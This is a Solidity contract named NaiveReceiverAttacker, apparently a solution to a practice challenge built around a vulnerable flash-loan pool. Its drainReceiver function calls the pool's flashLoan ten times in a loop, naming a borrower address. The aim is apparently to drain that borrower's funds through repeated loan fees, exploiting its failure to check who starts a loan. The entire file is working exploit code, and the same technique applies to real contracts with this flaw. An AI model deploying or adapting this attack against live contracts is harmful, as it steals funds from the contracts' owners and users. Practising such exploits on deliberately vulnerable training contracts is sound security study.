// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker{

    NaiveReceiverLenderPool pool;

    constructor(address payable _address){
        pool = NaiveReceiverLenderPool(_address);
    }

    function drainReceiver(address _borrower, uint256 _amount) external{
        for(uint i = 0; i < 10; i++){
            pool.flashLoan(_borrower, _amount);
        }
    }
}